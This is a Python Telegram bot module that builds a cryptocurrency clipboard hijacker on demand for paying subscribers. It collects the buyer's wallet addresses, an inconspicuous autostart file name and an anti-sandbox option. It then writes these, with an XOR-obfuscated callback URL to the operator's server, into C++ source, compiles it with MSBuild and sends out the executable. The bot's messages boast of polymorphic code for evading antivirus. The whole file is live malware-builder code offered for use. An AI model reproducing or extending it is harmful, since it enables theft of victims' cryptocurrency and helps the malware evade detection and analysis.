import asyncio
import base64
import os.path
import shutil
import traceback
import uuid

import arrow
from aiogram import F, types
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardButton, BufferedInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder

import config
from dbworker import add_build
from dispatcher import dp
from models.models import User


class Build(StatesGroup):
    antivm = State()
    name = State()
    prefix = State()
    wallets = State()


def yesno(prefix: str):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="Да", callback_data=f"{prefix}:yes"))
    builder.row(InlineKeyboardButton(text="Нет", callback_data=f"{prefix}:no"))
    return builder.as_markup()


def prefixsuffixbtn():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="Префикс", callback_data=f"prefix:yes"))
    builder.row(InlineKeyboardButton(
        text="Суффикс", callback_data=f"prefix:no"))
    return builder.as_markup()


def xor(input_string, key):
    encrypted_string = ""
    key_length = len(key)
    for i, char in enumerate(input_string):
        encrypted_char = ord(char) ^ ord(key[i % key_length])
        encrypted_string += chr(encrypted_char)
    return encrypted_string


@dp.message(F.text == "🔨 Билд")
async def makebuild(message: types.Message, user: User, state: FSMContext):
    timesub = arrow.get(user.subuntil)
    timesubpro = arrow.get(user.prosubuntil)
    timenow = arrow.now("Europe/Moscow")
    if (timesubpro > timenow) or (timesub > timenow):
        await message.answer("<b>Анти-ВМ (виртуальные машины)</b> — это защита, которая позволяет обнаружить, запущена ли программа в виртуальной среде, например, VirtualBox или VMware.\n\n"
                             "Если включить эту опцию, билд не будет работать в виртуальных машинах, песочницах или средах анализа, которые часто используются для исследования вредоносного ПО.\n"
                             "Таким образом, эта защита помогает скрыть поведение программы и предотвратить её анализ в контролируемых средах.\n\n"
                             "❓ Включить Анти-ВМ?", reply_markup=yesno("antivm"))
        await state.set_state(Build.antivm)
    else:
        await message.answer("<b>Для использования функции нужна подписка!</b>")


@dp.callback_query(F.data.startswith("antivm"), Build.antivm)
async def antivm(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    if callback_query.data == "antivm:yes":
        await state.update_data({"antivm": "true"})

    elif callback_query.data == "antivm:no":
        await state.update_data({"antivm": "false"})
    await callback_query.message.edit_text("<b>Введите имя файла для автозагрузки (без расширения .exe)</b>\n\n"
                                           "Это имя будет использовано для файла, который программа добавит в автозагрузку. "
                                           "Например, если вы введете 'MyApp', то в автозагрузке появится запись с именем:\n"
                                           "<code>MyApp.exe</code>\n\n"
                                           "Убедитесь, что имя файла выглядит достаточно незаметно, чтобы не привлекать внимание пользователя.")
    await state.set_state(Build.name)


@dp.message(Build.name)
async def name(message: types.Message, state: FSMContext, user: types.User):
    await state.update_data({"name": message.text})

    timesubpro = arrow.get(user.prosubuntil)
    timenow = arrow.now("Europe/Moscow")
    if timesubpro > timenow:
        await state.update_data({"prosub": "true"})
        await message.answer(
            "<b>Выберите, что использовать: префикс или суффикс при подмене адреса.</b>\n\n"
            "➤ <b>Префикс</b> — добавляется в начале адреса.\n"
            "Например, был адрес:\n"
            "<code>0x1234abcd5678efghd1f4f14fmun4</code>\n"
            "Сгенерирует с префиксом :\n"
            "<code>0x1234hgfe8765dcbah5j36g2d1fye</code>\n\n"
            "➤ <b>Суффикс</b> — добавляется в конец адреса.\n"
            "Например, был адрес:\n"
            "<code>T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb</code>\n"
            "Сгенерирует с суффиксом:\n"
            "<code>T2Dj3dF9jr3R9jmcf1gCjc1cnCJC00fWwb</code>\n\n"
            "❗️ Выберите, что использовать:", reply_markup=prefixsuffixbtn())
        await state.set_state(Build.prefix)
    else:
        await state.update_data({"prosub": "false"})
        await state.update_data({"prefix": "true"})
        await message.answer("<b>Введите адреса ваших кошельков в формате:</b>\n"
                             "<code>\n"
                             "BTC\n"
                             "BCH\n"
                             "ETH\n"
                             "LTC\n"
                             "XMR\n"
                             "DOGE\n"
                             "DASH\n"
                             "TRX\n"
                             "XRP\n"
                             "BNB\n"
                             "TON\n"
                             "</code>\n"
                             "Каждая строка должна содержать один кошелек для указанной криптовалюты. Убедитесь, что порядок соблюден — "
                             "каждый кошелек должен быть на своей строке. Например:\n\n"
                             "<code>\n"
                             "bc1qxyz... \n"
                             "qpm2qsz... \n"
                             "0x1234... \n"
                             "Labc123... \n"
                             "42xyz... \n"
                             "DBabc... \n"
                             "Xr123... \n"
                             "TA123... \n"
                             "rBcdef... \n"
                             "bnb1xyz...\n"
                             "EQabc... \n"
                             "</code>\n"
                             "Проверьте, что адреса верны и соответствуют нужной криптовалюте, так как они будут использоваться для автоматической подмены в буфере обмена.")
        await state.set_state(Build.wallets)


@dp.callback_query(F.data.startswith("prefix"), Build.prefix)
async def prefix(callback_query: types.CallbackQuery, state: FSMContext):
    if callback_query.data == "prefix:yes":
        await state.update_data({"prefix": "true"})
    elif callback_query.data == "prefix:no":
        await state.update_data({"prefix": "false"})
    await callback_query.message.edit_text("<b>Введите адреса ваших кошельков в формате:</b>\n"
                                           "<code>\n"
                                           "BTC\n"
                                           "BCH\n"
                                           "ETH\n"
                                           "LTC\n"
                                           "XMR\n"
                                           "DOGE\n"
                                           "DASH\n"
                                           "TRX\n"
                                           "XRP\n"
                                           "BNB\n"
                                           "TON\n"
                                           "</code>\n"
                                           "Каждая строка должна содержать один кошелек для указанной криптовалюты. Убедитесь, что порядок соблюден — "
                                           "каждый кошелек должен быть на своей строке. Например:\n\n"
                                           "<code>\n"
                                           "bc1qxyz... \n"
                                           "qpm2qsz... \n"
                                           "0x1234... \n"
                                           "Labc123... \n"
                                           "42xyz... \n"
                                           "DBabc... \n"
                                           "Xr123... \n"
                                           "TA123... \n"
                                           "rBcdef... \n"
                                           "bnb1xyz... \n"
                                           "EQabc... \n"
                                           "</code>\n"
                                           "Проверьте, что адреса верны и соответствуют нужной криптовалюте, так как они будут использоваться для автоматической подмены в буфере обмена.")
    await state.set_state(Build.wallets)


@dp.message(Build.wallets)
async def wallets(message: types.Message, state: FSMContext, user: types.User):
    if len(message.text.split("\n")) != 11:
        return await message.answer("<b>Неверное кол-во кошельков!</b>")
    data = await state.get_data()
    await state.clear()

    await state.clear()

       # Отправка первого сообщения о начале процесса
    msg = await message.answer("<b>Начинаю билдить...</b>\n🔄 Инициализация сборки...")
    await asyncio.sleep(2)
    # Имитация прогресса - этапы сборки с добавлением текста о шифровании и полиморфизме
    await msg.edit_text("<b>Начинаю билдить...</b>\n🔒 Применяем AES-шифрование для защиты кода...")
    await asyncio.sleep(2)  # Пауза для имитации работы

    await msg.edit_text("<b>Начинаю билдить...</b>\n🧬 Генерируем полиморфный код для обхода антивирусов...")
    await asyncio.sleep(2)  # Пауза для имитации работы

    await msg.edit_text("<b>Начинаю билдить...</b>\n🔨 Компиляция исходного кода и настройка защиты...")
    await asyncio.sleep(2)  # Пауза для имитации работы

    await msg.edit_text("<b>Начинаю билдить...</b>\n📦 Упаковка файлов и проверка целостности...")
    await asyncio.sleep(2)  # Пауза для имитации работы
    randompath = uuid.uuid4().hex
    wallets_text = message.text.split("\n")

    key = uuid.uuid4().hex.upper()
    urlxor = xor(f"http://{config.server_url}/{randompath}/", key)
    urlxor = base64.b64encode(urlxor.encode()).decode()

    try:
        shutil.copytree(os.path.join(os.getcwd(), "LClipper"),
                        os.path.join(os.getcwd(), f"{randompath}"))
        with open(os.path.join(os.getcwd(), f"{randompath}", "LClipper", "main.cpp"), "r", encoding="utf8") as f:
            text = f.readlines()

        for cnt, i in enumerate(text):
            if "#define STARTUP_NAME" in i:
                text[cnt] = f'#define STARTUP_NAME "{data["name"]}"\n'
            elif "#define FILE_NAME" in i:
                text[cnt] = f'#define FILE_NAME "{data["name"]}.exe"\n'
            elif "bool PRO" in i:
                text[cnt] = f'bool PRO = {data["prosub"]};\n'
            elif "#define ANTI_SANDBOX" in i:
                text[cnt] = f'#define ANTI_SANDBOX "{data["antivm"]}"\n'
            elif "#define CHECKPREFIX" in i:
                text[cnt] = f'#define CHECKPREFIX "{data["prefix"]}"\n'
            elif "std::string BTCLegacy_ADDRESS" in i:
                text[cnt] = f'std::string BTCLegacy_ADDRESS = "{wallets_text[0]}";\n'
            elif "std::string BTCScript_ADDRESS" in i:
                text[cnt] = f'std::string BTCScript_ADDRESS = "{wallets_text[0]}";\n'
            elif "std::string BTCSegWit_ADDRESS" in i:
                text[cnt] = f'std::string BTCSegWit_ADDRESS = "{wallets_text[0]}";\n'
            elif "std::string BTCTaproot_ADDRESS" in i:
                text[cnt] = f'std::string BTCTaproot_ADDRESS = "{wallets_text[0]}";\n'
            elif "std::string BCH_ADDRESS" in i:
                text[cnt] = f'std::string BCH_ADDRESS = "{wallets_text[1]}";\n'
            elif "std::string ETH_ADDRESS" in i:
                text[cnt] = f'std::string ETH_ADDRESS = "{wallets_text[2]}";\n'
            elif "std::string LTC_ADDRESS" in i:
                text[cnt] = f'std::string LTC_ADDRESS = "{wallets_text[3]}";\n'
            elif "std::string XMR_ADDRESS" in i:
                text[cnt] = f'std::string XMR_ADDRESS = "{wallets_text[4]}";\n'
            elif "std::string DOGE_ADDRESS" in i:
                text[cnt] = f'std::string DOGE_ADDRESS = "{wallets_text[5]}";\n'
            elif "std::string DASH_ADDRESS" in i:
                text[cnt] = f'std::string DASH_ADDRESS = "{wallets_text[6]}";\n'
            elif "std::string TRX_ADDRESS" in i:
                text[cnt] = f'std::string TRX_ADDRESS = "{wallets_text[7]}";\n'
            elif "std::string XRP_ADDRESS" in i:
                text[cnt] = f'std::string XRP_ADDRESS = "{wallets_text[8]}";\n'
            elif "std::string BNB_ADDRESS" in i:
                text[cnt] = f'std::string BNB_ADDRESS = "{wallets_text[9]}";\n'
            elif "std::string TON_ADDRESS" in i:
                text[cnt] = f'std::string TON_ADDRESS = "{wallets_text[10]}";\n'
            elif "#define KEY" in i:
                text[cnt] = f'#define KEY "{key}"\n'
            elif "#define LINK" in i:
                text[cnt] = f'#define LINK "{urlxor}"\n'

        with open(os.path.join(os.getcwd(), f"{randompath}", "LClipper", "main.cpp"), "w", encoding="utf8") as f:
            f.writelines(text)

        proc = await asyncio.create_subprocess_exec("C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe", f"/property:Configuration=Release", cwd=f"{os.path.join(os.getcwd(), f'{randompath}')}")
        await proc.wait()
        if os.path.exists(os.path.join(os.getcwd(), f"{randompath}", "x64", "Release", f"LClipper.exe")):
            await add_build(message.from_user.id, randompath)
            await msg.delete()
            await message.answer_document(document=BufferedInputFile(open(os.path.join(os.getcwd(), f"{randompath}", "x64", "Release", f"LClipper.exe"), "rb").read(), "Build.exe"))
            await message.answer(
                "✅ <b>Компиляция завершена успешно!</b>\n\n"
                "Ваш билд готов и был отправлен в виде файла. Проверьте его и используйте по назначению."
               )
        else:
            await message.answer("<b>Возникла ошибка!</b>")
    except Exception as e:
        traceback.print_exc()
        return await message.answer(f"<b>Возникла ошибка!\n{e}</b>")
    finally:
        shutil.rmtree(os.path.join(os.getcwd(), f"{randompath}"))



